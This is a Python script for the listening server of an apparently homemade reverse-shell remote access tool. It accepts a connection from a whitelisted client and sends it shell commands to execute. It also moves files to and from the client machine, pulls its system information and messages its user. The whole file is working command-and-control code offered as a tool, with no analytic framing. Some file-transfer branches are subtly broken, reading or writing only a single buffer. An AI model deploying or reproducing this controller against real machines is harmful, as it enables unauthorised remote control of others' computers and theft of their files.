import os

import socket
import colorama
from colorama import Fore
colorama.init(autoreset=True)


#server info
SERVER_HOST = "0.0.0.0"
WHITELIST_IPS = [""]
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
SEPARATOR = "<sep>"

#create server, bind server, listen for connections, and accept conections
s = socket.socket()

def server():
    s = socket.socket()
    s.bind((SERVER_HOST, SERVER_PORT))
    s.listen(5)
    print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")

    client_socket, client_address = s.accept()
    if client_address[0] not in WHITELIST_IPS:
        print(Fore.RED + "Client with a blacklisted IP of: " + client_address[0] + "tried to join, prevented it from connecting")
        client_socket.send("blacklisted".encode())
        s.close()
        server()
    else:
        client_socket.send("whitelisted".encode())
        print(Fore.GREEN + f"{client_address[0]}:{client_address[1]} Connected!")
        
        cwd = client_socket.recv(BUFFER_SIZE).decode()
        print(Fore.GREEN + "[+] Current working directory:", cwd)

        #main loop
        while True:
            try:
                #input and send commands to the client to be executed
                command = input(f"{cwd} $> ")
                if not command.strip():
                    continue

                client_socket.send(command.encode())
                if command.lower() == "exit":
                    break
                elif command.lower() == "upload":
                    #send file name to client
                    inp = input("File Name/Path: ")
                    client_socket.send(inp.encode())

                    #recive data from client
                    output = client_socket.recv(BUFFER_SIZE).decode()
                    filename, filesize = output.split(SEPARATOR)
                    filename = os.path.basename(filename)
                    filesize = float(filesize)

                    # download file to desktop
                    with open(filename, "wb") as f:
                        bytes_read = client_socket.recv(BUFFER_SIZE)
                        if not bytes_read:    
                            print(inp + "has been uploaded")
                            break
                        
                        f.write(bytes_read)
                elif command.lower() == "download":
                    inp2 = input("File Name/Path: ")
                    #recive file name and prepare to upload
                    filename2 = inp2
                    filesize2 = os.path.getsize(filename2)
                    client_socket.send(f"{filename2}{SEPARATOR}{filesize2}".encode())

                    #upload file to server
                    with open(filename2, "rb") as f:
                        bytes_read = f.read(BUFFER_SIZE)
                        if not bytes_read:
                            break
                        client_socket.sendall(bytes_read)
                elif command.lower() == "sysinf":
                    #receve parse and display system info to terminal
                    output = client_socket.recv(BUFFER_SIZE).decode()
                    results, cwd = output.split(SEPARATOR)
                    final_results = results.replace("\\n", "\n")
                    final_results = final_results.replace("', ", "")
                    final_results = final_results.replace("'", "")
                    final_results = final_results.replace("(", "")
                    final_results = final_results.replace(")", "")
                    final_results = final_results.replace(",", "")
                    print(final_results)
                elif command.lower() == "msg":
                    message = input("Message: ")
                    client_socket.send(message.encode())

                    has_responded = client_socket.recv(BUFFER_SIZE).decode()
                    if has_responded.lower() == "y" or has_responded.lower() == "yes":
                        response = client_socket.recv(BUFFER_SIZE).decode()
                        print()
                        print(Fore.CYAN + response)
                        print()
                    else:
                        continue
                elif command.lower() == "help":
                    print("="*30 + "Custom Commands" + "="*30)
                    print("\nexit: Close client and server\n\ndownload: Download files from client\n\nupload: Upload files from server end to client\n\nsysinf: Get system info from client's pc\n\nmsg: send message to client end, the client can then choose to respond or not\n\nhelp: displays this message")
                    print("="*75)
                else:
                    #recive and display output from commands
                    output = client_socket.recv(BUFFER_SIZE).decode()
                    results, cwd = output.split(SEPARATOR)
                    print(results)
            except socket.error as e:
                if command.lower() != "exit":
                    print(Fore.RED + "Socket Error: " + str(e))
                    print(Fore.RED + "Restarting server...")
                    s = socket.socket()
                    s.bind((SERVER_HOST, SERVER_PORT))
                    s.listen(5)
                else:
                    break
                
server()
